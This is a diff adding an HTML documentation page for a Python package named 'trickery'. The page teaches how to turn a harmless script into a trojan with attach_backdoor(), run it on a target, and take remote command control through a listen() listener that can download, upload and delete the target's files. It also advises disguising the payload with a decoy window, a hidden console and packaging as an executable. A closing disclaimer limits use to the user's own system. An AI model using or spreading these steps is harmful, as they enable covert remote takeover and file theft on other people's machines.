@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Documentation of Trickery</title>
+ 	    <meta charset="UTF-8">
+	    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+            <link rel="preconnect" href="https://fonts.googleapis.com">
+	    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+            <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap" rel="stylesheet">
+	    <link href="index.css" rel="stylesheet">
+    </head>
+    <body>
+        <div class="jumbotron jumbotron-fluid">
+             <div class="container">
+    		 <h1 style="text-align:center"><u>Trickery-Documentation</u></h1></br>
+                 <h5 style="text-align:center">A module to embedd a third-party service into a custom code.</h5>
+		 <hr>	
+		 <h2>&nbsp;<u>Package Description</u></h2>
+ 		 <br>
+		 <h3>&emsp;Steps with the help of examples (How to Use?):</h3>
+		 <br>	
+		 <p class="lead">First let's just create a clean python file and name it as <span class="filed">hello.py</span></p>
+		 <div class="codebox">
+		     <p><span class="comment">#Here goes our custom code-</span></p>		
+		     <p><span class="yell">print</span>("Hello World!")</p>	
+                 </div>
+		 <p class="lead">Now printing just "Hello World!" is obviously non-malicious, so how do we convert it into a malware and compromise that system by just a pinch of code? Here comes the role of trickery which lets you easily hack the system completely with just adding 2-3 lines of code in your main custom program. Here is how-</p>
+		 <div class="codebox">
+		     <p><span class="yell">from</span> trickery <span class="yell">import</span> attack_backdoor <span class="comment">#This will import the function from trickery which will attach the backdoor into hello.py</span></p>
+			</br>	
+                     <p><span class="yell">def</span> main(): <span class="comment">#This main function will have your clean custom code which will social engineer the target</span></p>
+		     <p>&emsp;&emsp;<span class="yell">print</span>("Hello World!")</p>
+			</br>
+		     <p>attach_backdoor("localhost",1234,main,False) <span class="comment">#Arguments passed are: -ip,-port (the IP address of the hacker's/tester's machine on which the listener is to be bind), -mainFunc (main function to be passed because it has clean code and will threaded by this attach_backdoor method), -ipv6 (Pass true for ipv6 address)</span></p>
+                 </div>		
+		 <p class="lead">Now save this program in a new file as <span class="filed">evil-hello.py</span> and run it on the target system.</p>
+		 </br>	
+		 <p> <i><u>NOTE</u>: It is suggested to avoid the print function in clean code, instead open any image or a graphic window (using tkinter) when the file will run, and change the python file to no console python file (i.e. .py to .pyw in order to disable the console window). Also packaging it afterwards, depending upon the operating system of target machine (-for example: converting python file to executable for windows), would require no pre-installation of python module.</i></p></br>
+		 <p class="lead">Now we are almost done as we just need to bind a listener to hear for incoming connections which can be done either by the manual setup or with the help of trickery.listen() function.</p></br>
+		 <p class="lead">Here is how to bind the listener on the hacker's system using listen method by creating a new file as <span class="filed">listener.py</span>-</p>
+		 <div class="codebox">
+		     <p><span class="yell">from</span> trickery <span class="yell">import</span> listen <span class="comment">#This will import the listen function from trickery to bind the address for receiving incomings</span></p></br>
+		     <p>listen("localhost",1234,False) <span class="comment">#Pass ip,port and True/False for ipv6 protocol (all arguments to be passed same as in attach-backdoor function of evil-hello.py to hear for that particular system)</span></p>
+                 </div>
+		 <p class="lead">Done, just run the listener and wait for incoming connection of the target. Once the connection is received, the target ip will be displayed on console and in the next line it will ask for the command that will be executed on the target system.</p>
+                 </br>
+		 <p class="lead">Now the commands depend upon the operating system used by the target. Basic commands can be found here- </p>
+		 <ul type="circle">
+		 <li><a href="https://maker.pro/linux/tutorial/basic-linux-commands-for-beginners">Linux</a></li>
+		 <li><a href="https://www.makeuseof.com/tag/mac-terminal-commands-cheat-sheet/">macOS</a></li>
+		 <li><a href="https://www.thomas-krenn.com/en/wiki/Cmd_commands_under_Windows">Windows</a>
+		 </ul>	
+		 <p class="lead">Other commands that have been added to trickery.listen() are- </p>
+		 <ul>
+		 <li>To download any file from the target's system to the hacker's system - <b>download filename.exe</b></li>
+		 <li>To upload any file from the hacker's system to target's system - <b>upload filename.exe</b></li>
+		 <li>To delete any file from the target's system - <b>delete filename.exe</b></li>
+		 </ul>							
+		 </br><hr>
+                 <p class="lead"><b><u>Warning!</u></b></p>   
+                 <p class="lead">The package is supposed to be use only for personal knowledge and strictly on the user's system and device. In case any illegal activity found carried out by the user, the author will not be responsible for any consequeces. </p>
+            </div>
+        </div></br>
+    </body>
+</html>
